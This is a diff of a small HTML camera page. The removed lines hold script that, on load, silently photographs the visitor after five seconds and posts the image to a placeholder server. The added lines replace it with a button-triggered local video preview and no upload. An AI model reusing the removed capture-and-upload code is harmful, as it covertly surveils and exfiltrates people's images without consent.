@@ -4,31 +4,22 @@
   <title>Camera Access</title>
 </head>
 <body>
-  <h2 style="text-align:center;">Allow Camera Access</h2>
-  <video id="video" width="300" autoplay></video>
+  <h1>Camera Access</h1>
+  <button id="start-camera">Start Camera</button>
+  <video id="video" width="640" height="480"></video>
   <script>
     const video = document.getElementById('video');
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    const startCameraButton = document.getElementById('start-camera');
+
+    startCameraButton.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        const track = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(track);
-        setTimeout(() => {
-          imageCapture.takePhoto()
-            .then(blob => {
-              const formData = new FormData();
-              formData.append('photo', blob, 'photo.jpg');
-              fetch('https://yourserver.com/upload', {
-                method: 'POST',
-                body: formData
-              });
-              track.stop();
-            })
-        }, 5000);
-      })
-      .catch(err => {
-        alert('Camera access denied');
-      });
+        video.play();
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    });
   </script>
 </body>
 </html>
